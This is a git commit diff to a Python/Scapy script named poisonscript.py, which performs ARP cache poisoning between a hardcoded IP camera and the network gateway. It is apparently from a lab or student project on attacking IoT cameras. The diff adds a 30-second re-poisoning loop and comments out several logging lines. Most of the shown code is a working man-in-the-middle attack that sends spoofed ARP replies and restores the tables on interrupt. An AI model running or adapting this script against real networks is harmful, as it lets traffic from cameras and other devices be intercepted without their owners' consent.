c7d2c7ff81a3982f5d4729301be299e530186db0
Ana <80358880+solaunar@users.noreply.github.com>
2022-06-07 19:55:00 +0200

    update poisonscript.py

--- poisonscript.py
+++ poisonscript.py
@@ -1,3 +1,5 @@
+import time
+
 from scapy.config import conf
 conf.ipv6_enabled = False
 
@@ -7,21 +9,22 @@ import logging
 root = logging.getLogger()
 root.setLevel(logging.INFO)
 
+suspendTimeInSeconds = 30
 
 """
 Function that retrieves the MAC address by IP of a device (retries in case the tries fail).
 @param ip: string, IP Address we want to get the MAC from.
 """
 def getmac(ip):
-	logging.info("Getting MAC Address for IP: {ip}".format(ip = ip))
+	#logging.info("Getting MAC Address for IP: {ip}.".format(ip))
 	mac = None
 	tries = 1
 	while (mac == None and tries < 10):
-		logging.debug("MAC retrieval for IP: {ip}. Try: {try}.".format(ip, tries))
+		#logging.debug("MAC retrieval for IP: {ip}. Try: {try}.".format(ip, tries))
 		mac = getmacbyip(ip)
 		tries += 1
 	if (mac == None):
-		raise Exception("MAC Address could not be obtained for IP: {ip}".format(ip = ip))
+		raise Exception("MAC Address could not be obtained for IP: {ip}".format(ip))
 	return mac
 
 """
@@ -31,8 +34,7 @@ Function that sends a spoofed ARP packet to a target ip and mac address by a sou
 @param: sourceip: string, Source IP Address.
 """
 def poisonarp(targetip, targetmac, sourceip):
-	logging.debug("Poisoning ARP with Target IP: {targetip}, Target MAC: {targetmac}, \
-		Source IP: {sourceip}".format(targetip, targetmac, sourceip))
+	#logging.debug("Poisoning ARP with Target IP: {targetip}, Target MAC: {targetmac}, Source IP: {sourceip}".format(targetip, targetmac, sourceip))
 	poisonPkt = ARP(op = 2 , pdst = targetip, psrc = sourceip, hwdst = targetmac)
 	send(poisonPkt, verbose= False)
 
@@ -44,11 +46,10 @@ Function that restored the ARP tables.
 @param: sourcemac: string, Source MAC Address
 """
 def restorearp(targetip, targetmac, sourceip, sourcemac):
-	logging.debug("Restoring ARP with Target IP: {targetip}, Target MAC: {targetmac}, \
-		Source IP: {sourceip}, Source MAC: {sourcemac}".format(targetip, targetmac, sourceip, sourcemac))
+	#logging.debug("Restoring ARP with Target IP: {targetip}, Target MAC: {targetmac}, \ Source IP: {sourceip}, Source MAC: {sourcemac}".format(targetip, targetmac, sourceip, sourcemac))
 	packet = ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
 	send(packet, verbose=False)
-	logging.info('ARP Table restored to normal for IP: {address}.'.format(address = targetip))
+	#logging.info('ARP Table restored to normal for IP: {address}.'.format(address = targetip))
 
 def main():
 	attackerip = conf.route.route("0.0.0.0")[1]
@@ -58,7 +59,7 @@ def main():
 
 	# do not hardcode cameraip, because it might reset, ideally create script to prevent reset packets from the camera
 	# possible defense mechanism there
-	cameraip = "192.168.1.14"
+	cameraip = "192.168.1.15"
 	try:
 		cameramac = getmac(cameraip)
 	except Exception as e:
@@ -84,6 +85,8 @@ def main():
 			# Add sleep timer for the poison act
 			poisonarp(cameraip, cameramac, gatewayip)
 			poisonarp(gatewayip, gatewaymac, cameraip)
+			logging.info('Re-poisoning the targets in {suspendTimeInSeconds} seconds.'.format(suspendTimeInSeconds = suspendTimeInSeconds))
+			time.sleep(suspendTimeInSeconds)
 	except KeyboardInterrupt:
 		logging.info('Stopping poisoning...')
 		restorearp(gatewayip, gatewaymac, cameraip, cameramac)
